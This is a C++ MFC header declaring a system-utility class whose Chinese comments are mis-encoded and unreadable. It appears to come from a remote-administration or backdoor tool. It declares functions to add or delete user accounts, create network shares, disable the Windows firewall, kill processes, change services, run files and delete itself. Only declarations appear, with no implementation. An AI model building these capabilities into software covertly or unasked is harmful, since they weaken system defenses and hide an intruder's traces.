// SystemUtility.h: interface for the CSystemUtility class.
//
//////////////////////////////////////////////////////////////////////
#include <vector>
#include "UtilityStruct.h"
#if !defined(AFX_SYSTEMUTILITY_H__5D7DF9EC_BFB7_4F1E_9BE2_4F601A1A41E9__INCLUDED_)
#define AFX_SYSTEMUTILITY_H__5D7DF9EC_BFB7_4F1E_9BE2_4F601A1A41E9__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CSystemUtility  
{
public:
	CSystemUtility();
	virtual ~CSystemUtility();

	static BOOL CALLBACK EnumWindowsProc( HWND hWnd, LPARAM lParam);

	
	BOOL		EnableDebugPriv();
	BOOL		ForceExitWindow(UINT uFlags);

	BOOL		DrawScreenText(CString strText,UINT nFontHeight = 50,COLORREF clrFont = RGB(0,0,255));
	
	//			�ļ���Ŀ¼����
	BOOL		LocalFileExcute(CString strFileName,BOOL bNormal);
	BOOL		LocalFileDelete(CString strFileName,BOOL bDir = FALSE);
	BOOL		LocalFileDirCreate(CString strFileName);
	BOOL		GetPathList(CString strPath,std::vector<FILE_INFO_S>* pVecTor);

	//			��ȡ�����б�
	DWORD		GetWindowsList(std::vector<WINDOW_INFO_S>* pVecTor);
	
	//			��ȡ��ǰ�����б�
	DWORD		GetProcessList(std::vector<PROCESS_INFO_S>* pVecTor);
	//			�رս���
	BOOL		KillProcess(DWORD dwProcessId);
		
	//			��ȡ��ǰ�����б�
	DWORD		GetServiceList(std::vector<SERVICE_INFO_S>* pVecTor);
	//			�޸ķ�����������
	BOOL		SetServiceStartType(CString strServiceName,DWORD dwStartType); 
	//			�޸ķ���״̬
	BOOL		SetServiceState(CString strServiceName,DWORD dwState);
	
	//			��ӻ�ɾ���û�
	BOOL		NetUser(BOOL bAdd,CString strUser,CString strPWD);

	//			��ĳ������Ϊ�����رչ���
	BOOL		NetShare(BOOL bAdd,CString strDisk);

	//			��ʼ��ر�WINDOWS����ǽ
	BOOL		NetFireWall(BOOL bStart);
	
	//			ɾ����������ļ�,�ú������ý���,���˳�����
	BOOL		DeleteSelf();


protected:
	BOOL		DeleteDirectory(char *DirName);
		
};

#endif // !defined(AFX_SYSTEMUTILITY_H__5D7DF9EC_BFB7_4F1E_9BE2_4F601A1A41E9__INCLUDED_)
